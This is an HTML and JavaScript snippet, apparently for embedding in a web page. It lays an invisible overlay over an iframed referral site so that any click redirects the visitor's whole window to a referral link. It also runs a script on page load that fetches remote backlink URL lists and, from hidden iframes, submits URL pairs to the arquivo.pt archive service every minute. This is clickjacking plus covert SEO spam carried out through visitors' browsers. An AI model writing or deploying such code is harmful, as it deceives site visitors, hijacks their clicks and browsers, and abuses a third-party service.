<!-- -->
<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>

<div id="container">
<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
<div id="clickCatcher"></div>
</div>

<script>
      document.getElementById("clickCatcher").addEventListener("click", function () {
        	//window.location.href = "http://folllike.com/?19384926";
		
		    // Changes top window; will throw if cross-origin
		    top.location.href = 'http://folllike.com/?19384926';
		    // or to replace current history:
		    // top.location.replace('http://folllike.com/?19384926');
      });
</script>
<!---------------------------------------------------------->

<div id="iframeContainer"></div>

<script type="text/javascript">
//<![CDATA[
/*
  Enhanced version:
   - main URLs are fetched from the provided mainFetchURLs list (same behavior as extraSecondURLs)
   - second URLs built from extraSecondURLs + fetchURLs (as previously)
   - no duplicates, persistent with safe fallbacks (IDB -> localStorage -> memory)
   - round-robin merge across sources up to MAX_*_ITEMS
   - provides getNextMain(), getNextSecond(), getNextPair()
*/

/////////////////////// CONFIG ///////////////////////
const mainSeed = [
  // optional local seeds for main (kept small or empty)
  // you can keep your original main list here if you want seeds preserved
  // "https://seoquickbacklink.blogspot.com/",
];

const extraSecondURLs = [
  "https://smartbacklinkmaker.blogspot.com/",
  "https://backlinkautogen.blogspot.com/",
  "https://seobacklinkbuildertool.blogspot.com/",
  "https://backlinkcreator360.blogspot.com/",
  "https://megabacklinktool.blogspot.com/"
  // add or keep your existing second seeds
];

// remote sources for second (unchanged from previous script)
const fetchSecondSources = [
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/blogger-domains.json",
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/referral.json",
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/seekers-of-decay.json"
];

// remote sources for main (you asked these to be fetched same as extraSecondURLs)
const fetchMainSources = [
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator-domains.json",
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
];

const MAX_MAIN_ITEMS = 1000;
const MAX_SECOND_ITEMS = 1000;

const DB_NAME = "urlStoreDB_v3";
const DB_STORE = "urlStore_v3";
const LS_MAIN_KEY = "mainURLs_mirror_v3";
const LS_SECOND_KEY = "secondURLs_mirror_v3";
const CURSOR_MAIN_KEY = "main_cursor_v3";
const CURSOR_SECOND_KEY = "second_cursor_v3";

/////////////////////// IDB HELPERS ///////////////////////
function openDB() {
  return new Promise((resolve, reject) => {
    try {
      const req = indexedDB.open(DB_NAME, 1);
      req.onupgradeneeded = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains(DB_STORE)) db.createObjectStore(DB_STORE);
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    } catch (e) {
      reject(e);
    }
  });
}
async function idbPut(key, value) {
  const db = await openDB();
  return new Promise((res, rej) => {
    try {
      const tx = db.transaction(DB_STORE, "readwrite");
      tx.objectStore(DB_STORE).put(value, key);
      tx.oncomplete = () => res();
      tx.onerror = () => rej(tx.error);
    } catch (e) {
      rej(e);
    }
  });
}
async function idbGet(key) {
  const db = await openDB();
  return new Promise((resolve, reject) => {
    try {
      const tx = db.transaction(DB_STORE, "readonly");
      const req = tx.objectStore(DB_STORE).get(key);
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    } catch (e) {
      reject(e);
    }
  });
}

/////////////////////// SAFE STORAGE FALLBACKS ///////////////////////
let memoryStore = { main: null, second: null };
let memoryCursorMain = 0;
let memoryCursorSecond = 0;

async function safeIdbGet(key) { try { return await idbGet(key); } catch (e) { return null; } }
async function safeIdbPut(key, value) { try { await idbPut(key, value); return true; } catch (e) { return false; } }
function safeLsGet(key) { try { const raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : null; } catch (e) { return null; } }
function safeLsPut(key, value) { try { localStorage.setItem(key, JSON.stringify(value)); return true; } catch (e) { return false; } }

async function saveList(name, arr) {
  // try IDB first, then LS, else memory
  const key = (name === "main") ? "main" : "second";
  if (await safeIdbPut(key, arr)) {
    if (name === "main") safeLsPut(LS_MAIN_KEY, arr);
    else safeLsPut(LS_SECOND_KEY, arr);
    return "idb";
  }
  if ((name === "main" ? safeLsPut(LS_MAIN_KEY, arr) : safeLsPut(LS_SECOND_KEY, arr))) {
    if (name === "main") memoryStore.main = arr;
    else memoryStore.second = arr;
    return "localStorage";
  }
  if (name === "main") memoryStore.main = arr;
  else memoryStore.second = arr;
  return "memory";
}

async function loadList(name) {
  if (name === "main") {
    const db = await safeIdbGet("main");
    if (Array.isArray(db) && db.length) return db;
    const ls = safeLsGet(LS_MAIN_KEY);
    if (Array.isArray(ls) && ls.length) return ls;
    if (Array.isArray(memoryStore.main) && memoryStore.main.length) return memoryStore.main;
    return null;
  } else {
    const db = await safeIdbGet("second");
    if (Array.isArray(db) && db.length) return db;
    const ls = safeLsGet(LS_SECOND_KEY);
    if (Array.isArray(ls) && ls.length) return ls;
    if (Array.isArray(memoryStore.second) && memoryStore.second.length) return memoryStore.second;
    return null;
  }
}

/////////////////////// UTILITIES ///////////////////////
function normalizeArrayFromFetch(data) {
  // Accept an array directly, or an object containing arrays under common keys
  if (!data) return [];
  if (Array.isArray(data)) return data;
  if (typeof data === "object") {
    // common places to look for arrays
    for (const k of ["urls", "data", "items", "list"]) {
      if (Array.isArray(data[k])) return data[k];
    }
    // otherwise collect string values
    const arr = [];
    for (const v of Object.values(data)) {
      if (typeof v === "string") arr.push(v);
      else if (Array.isArray(v)) arr.push(...v);
    }
    return arr;
  }
  return [];
}

function shuffleInPlace(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
}

// round-robin merge (fairness across sources)
function roundRobinMerge(perSourceArrays, maxItems) {
  const result = [];
  const sources = perSourceArrays.map(a => a.slice());
  let any = true;
  while (result.length < maxItems && any) {
    any = false;
    for (let i = 0; i < sources.length && result.length < maxItems; i++) {
      if (sources[i] && sources[i].length) {
        result.push(sources[i].shift());
        any = true;
      }
    }
  }
  return result;
}

/////////////////////// BUILD & PERSIST LISTS ///////////////////////

// fetch sources and return array of per-source arrays (each source deduped)
async function fetchSources(sourceUrls) {
  const perSource = [];
  for (const src of sourceUrls) {
    try {
      const resp = await fetch(src, { cache: "no-store" });
      if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
      const json = await resp.json();
      const arr = normalizeArrayFromFetch(json)
        .map(u => (typeof u === "string" ? u.trim() : ""))
        .filter(Boolean);
      const uniq = Array.from(new Set(arr));
      shuffleInPlace(uniq);
      perSource.push(uniq);
      console.log(`Loaded ${uniq.length} from ${src}`);
    } catch (err) {
      console.warn(`Failed to fetch ${src}:`, err && err.message ? err.message : err);
      perSource.push([]); // keep slot for fairness
    }
  }
  return perSource;
}

async function refreshAndStoreMain() {
  // Assemble per-source arrays: include mainSeed as first source (if you want)
  const perSource = [];
  perSource.push(Array.from(new Set(mainSeed.map(u => (typeof u === "string" ? u.trim() : "")).filter(Boolean))));
  const fetched = await fetchSources(fetchMainSources);
  perSource.push(...fetched);

  const merged = roundRobinMerge(perSource, MAX_MAIN_ITEMS);
  const final = Array.from(new Set(merged)); // global dedupe
  const storageUsed = await saveList("main", final);
  console.log(`main: stored ${final.length} URLs (storage: ${storageUsed})`);
  return final;
}

async function refreshAndStoreSecond() {
  // per-source: treat mainSeed as one source? For previous behavior we included main as a source for second.
  const perSource = [];
  // include mainSeed as one source (so original seeds appear in second too) and extraSecondURLs
  perSource.push(Array.from(new Set(mainSeed.map(u => (typeof u === "string" ? u.trim() : "")).filter(Boolean))));
  perSource.push(Array.from(new Set(extraSecondURLs.map(u => (typeof u === "string" ? u.trim() : "")).filter(Boolean))));
  // fetch remote sources for second
  const fetched = await fetchSources(fetchSecondSources);
  perSource.push(...fetched);

  const merged = roundRobinMerge(perSource, MAX_SECOND_ITEMS);
  const final = Array.from(new Set(merged));
  const storageUsed = await saveList("second", final);
  console.log(`second: stored ${final.length} URLs (storage: ${storageUsed})`);
  return final;
}

/////////////////////// CURSOR HELPERS ///////////////////////
function getCursor(key) {
  try {
    const raw = localStorage.getItem(key);
    if (raw !== null) {
      const n = Number(raw);
      if (!Number.isNaN(n)) return n;
    }
  } catch (e) {
    // localStorage blocked
  }
  if (key === CURSOR_MAIN_KEY) return memoryCursorMain || 0;
  return memoryCursorSecond || 0;
}
function setCursor(key, n) {
  try {
    localStorage.setItem(key, String(n));
  } catch (e) {
    if (key === CURSOR_MAIN_KEY) memoryCursorMain = n;
    else memoryCursorSecond = n;
  }
}

/////////////////////// ACCESSORS ///////////////////////
async function getNextFrom(name, loaderFunc, cursorKey) {
  let list = await loaderFunc();
  if (!Array.isArray(list) || list.length === 0) {
    // try refreshing if empty
    if (name === "main") list = await refreshAndStoreMain();
    else list = await refreshAndStoreSecond();
  }
  if (!Array.isArray(list) || list.length === 0) return null;
  let cursor = getCursor(cursorKey);
  if (cursor >= list.length) cursor = 0;
  const item = list[cursor];
  cursor = (cursor + 1) % list.length;
  setCursor(cursorKey, cursor);
  return item;
}

async function getNextMain() { return await getNextFrom("main", async () => await loadList("main"), CURSOR_MAIN_KEY); }
async function getNextSecond() { return await getNextFrom("second", async () => await loadList("second"), CURSOR_SECOND_KEY); }

async function getNextPair() {
  const main = await getNextMain();
  const second = await getNextSecond();
  if (!main || !second) return null;
  return `${main}?${second}`;
}

/////////////////////// ARCHIVING HELPER & WORKERS ///////////////////////
function archiveWebsite(url, target = "") {
  const form = document.createElement('form');
  form.action = "https://arquivo.pt/services/archivepagenow?l=pt";
  form.referrerPolicy = "no-referrer";
  form.method = "POST";
  form.target = target;
  form.style.display = "none";

  const input = document.createElement('input');
  input.type = "text";
  input.name = "url";
  input.value = url;

  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
  form.remove();
}

async function runArchiveWorkers(iframeCount = 6, intervalMs = 60000) {
  const container = document.getElementById("iframeContainer");

  // ensure lists exist
  let m = await loadList("main");
  let s = await loadList("second");
  if (!m || m.length === 0) m = await refreshAndStoreMain();
  if (!s || s.length === 0) s = await refreshAndStoreSecond();

  for (let i = 0; i < iframeCount; i++) {
    const iframe = document.createElement("iframe");
    iframe.name = `hiddenFrame${i}`;
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "300px";
    container.appendChild(iframe);

    // initial archive
    (async () => {
      const pair = await getNextPair();
      if (pair) archiveWebsite(pair, iframe.name);
    })();

    // periodic archive
    setInterval(async () => {
      const pair = await getNextPair();
      if (pair) archiveWebsite(pair, iframe.name);
    }, intervalMs);
  }
}

/////////////////////// INIT ///////////////////////
(async function init() {
  try {
    const m = await loadList("main");
    const s = await loadList("second");
    if (!m || m.length === 0) await refreshAndStoreMain();
    if (!s || s.length === 0) await refreshAndStoreSecond();

    console.log("Initialization complete. Starting archive workers.");
    runArchiveWorkers(6, 60000);
  } catch (e) {
    console.error("Init error:", e && e.message ? e.message : e);
    // try fallback: refresh and run
    try {
      await refreshAndStoreMain();
      await refreshAndStoreSecond();
      runArchiveWorkers(6, 60000);
    } catch (err) {
      console.error("Fallback init failed:", err && err.message ? err.message : err);
    }
  }
})();

// Expose helpers to console if you want to test manually
window._urlTools = {
  refreshAndStoreMain,
  refreshAndStoreSecond,
  getNextMain,
  getNextSecond,
  getNextPair
};
//]]>
</script>
